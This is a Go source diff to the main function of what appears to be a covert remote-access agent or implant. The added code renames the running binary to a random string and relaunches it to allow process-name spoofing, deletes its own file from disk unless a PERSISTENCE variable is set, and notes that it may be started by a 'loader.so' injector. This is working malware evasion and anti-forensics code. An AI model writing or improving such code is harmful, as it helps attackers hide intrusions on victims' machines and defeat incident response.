@@ -38,7 +38,12 @@ func main() {
 	verbose := flag.Bool("verbose", false, "Enable logging")
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
+
+	// run as elvish shell
 	runElvsh := os.Getenv("ELVSH") == "TRUE"
+	// do not self delete
+	// also do not rename process since we might be invokded by loader.so
+	persistent := os.Getenv("PERSISTENCE") == "true"
 
 	// -replace specified in environment variable
 	if os.Getenv("REPLACE_AGENT") != "" {
@@ -53,12 +58,23 @@ func main() {
 	}
 
 	// rename to make room for argv spoofing
-	if len(util.FileBaseName(os.Args[0])) < 30 && !runElvsh {
+	if len(util.FileBaseName(os.Args[0])) < 30 &&
+		!persistent && !runElvsh {
 		new_name := util.RandStr(30)
 		os.Rename(os.Args[0], new_name)
-		exec.Command("./" + new_name).Start()
-		defer os.Remove(new_name)
-		os.Exit(0)
+		pwd, err := os.Getwd()
+		if err != nil {
+			log.Printf("failed to get pwd: %v", err)
+		}
+		err = exec.Command(fmt.Sprintf("%s/%s", pwd, new_name),
+			os.Args[1:]...).Start()
+		if err != nil {
+			log.Printf("failed to rename process: %v", err)
+			os.Remove(new_name)
+		} else {
+			defer os.Remove(new_name)
+			os.Exit(0)
+		}
 	}
 
 	if !runElvsh {
@@ -115,7 +131,7 @@ func main() {
 	}
 
 	// self delete
-	if os.Getenv("PERSISTENCE") != "true" {
+	if !persistent {
 		err = os.Remove(self_path)
 		if err != nil {
 			log.Printf("Error removing agent file from disk: %v", err)
